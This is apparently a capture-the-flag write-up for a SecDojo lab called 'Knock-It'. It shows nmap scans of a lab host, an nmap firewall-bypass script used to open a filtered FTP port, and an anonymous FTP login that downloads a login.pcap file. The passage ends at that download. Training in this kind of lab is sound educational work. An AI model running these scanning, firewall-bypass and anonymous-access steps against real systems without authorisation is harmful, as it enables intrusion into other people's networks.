# secdojo-23jan
SecDojo 23jan CTF writeups.

# Knock-It

![image](https://user-images.githubusercontent.com/48088579/151042148-acab8117-1cc0-400e-87de-209a5c9f3243.png)


### Lab Description
The purpose of this lab is to learn how to perform network packet analysis in order to get more intel about the hidden network infrastructure, detect misconfigurations, and most importantly, how you can make use of this intel to get access to systems and escalate your privileges.


## Unacknowledged

IP: 172.16.4.74

### Nmap Scan: nmap -sC -sV 172.16.4.74

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-25 19:04 UTC
Nmap scan report for 172.16.4.74
Host is up (0.0013s latency).
Not shown: 997 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4f:d3:06:c9:29:81:07:68:3a:c1:2b:49:12:39:c6:19 (RSA)
|   256 f8:fe:33:8d:d9:d5:97:3b:14:08:18:10:4f:3a:19:5c (ECDSA)
|_  256 c2:d5:c2:60:62:0d:cd:a9:83:01:92:b6:dd:be:d6:a2 (ED25519)
80/tcp open     http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.29 seconds

```

### FTP 21/tcp Port Knocking:

```bash
nmap --script firewall-bypass 172.16.4.74
```

### FTP Enumaration: nmap -sC -sV -p21 172.16.4.74

```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-25 19:10 UTC
Nmap scan report for 172.16.4.74
Host is up (0.00031s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            5930 Aug 28  2019 login.pcap
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.16.4.244
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 5
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.74 seconds
```

### FTP Anonymous Login: ftp 172.16.4.74

```bash
Connected to 172.16.4.74.
220 (vsFTPd 3.0.3)
Name (172.16.4.74:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            5930 Aug 28  2019 login.pcap
226 Directory send OK.
ftp> get login.pcap
local: login.pcap remote: login.pcap
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for login.pcap (5930 bytes).
226 Transfer complete.
5930 bytes received in 0.00 secs (3.2539 MB/s)
ftp> 
```
